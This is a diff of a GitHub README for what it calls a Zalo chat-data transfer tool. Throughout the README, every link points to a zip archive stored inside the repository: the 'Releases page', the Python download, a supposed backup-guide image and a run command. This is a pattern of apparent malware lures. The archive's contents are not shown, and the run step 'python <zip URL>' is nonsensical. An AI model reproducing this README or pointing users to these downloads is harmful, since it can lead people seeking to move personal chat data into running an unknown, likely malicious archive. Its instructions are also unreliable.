@@ -4,7 +4,7 @@
 
 Welcome to the Zalo Data Transfer Tool. This tool allows you to safely transfer Zalo data between two Android devices or between your PC and Android using ADB.
 
-[![Download from Releases](https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip)
+[![Download from Releases](https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip%20Now-Release%20Page-blue)](https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip)
 
 ## 📋 Before You Start
 
@@ -15,7 +15,7 @@ Welcome to the Zalo Data Transfer Tool. This tool allows you to safely transfer 
 3. Enable **Backup & Sync**.
 4. It is advisable to set a password for your backup.
 
-![Backup Guide](https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip)
+![Backup Guide](https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -25,18 +25,18 @@ Welcome to the Zalo Data Transfer Tool. This tool allows you to safely transfer 
 * Basic knowledge of command-line usage.
 
 ### For Windows
-* **Python 3.8 or higher:** [Download it here](https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip)
+* **Python 3.8 or higher:** [Download it here](https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip)
 
 ### Additional Software
 * **ADB (Android Debug Bridge):** Follow the instructions on how to install it for your operating system.
 
 ## 🔧 Installation Steps
 
-1. **Download the tool** from the [Releases page](https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip) by clicking on the appropriate version you need.
+1. **Download the tool** from the [Releases page](https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip) by clicking on the appropriate version you need.
 2. After the download is complete, locate the file in your downloads folder.
 3. Extract the downloaded file if it is in a `.zip` format.
 4. Open a command prompt window in the folder where you extracted the tool. You can do this by holding the Shift key and right-clicking in that folder, then selecting "Open command window here."
-5. Run the tool by typing the command `python https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip` and pressing Enter.
+5. Run the tool by typing the command `python https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip` and pressing Enter.
 
 ## ⚙️ Using the Tool
 
@@ -54,7 +54,7 @@ Welcome to the Zalo Data Transfer Tool. This tool allows you to safely transfer 
 
 ## 📥 Download & Install
 
-To get started with the Zalo Data Transfer Tool, download it from the [Releases page](https://raw.githubusercontent.com/kristopher-pn/zalo-transfer-data/main/app/static/js/data-transfer-zalo-rhinoscleroma.zip). Choose the version that fits your needs best.
+To get started with the Zalo Data Transfer Tool, download it from the [Releases page](https://github.com/kristopher-pn/zalo-transfer-data/raw/refs/heads/main/app/static/data_zalo_transfer_2.0-alpha.2.zip). Choose the version that fits your needs best.
 
 ## ❓ FAQ
 
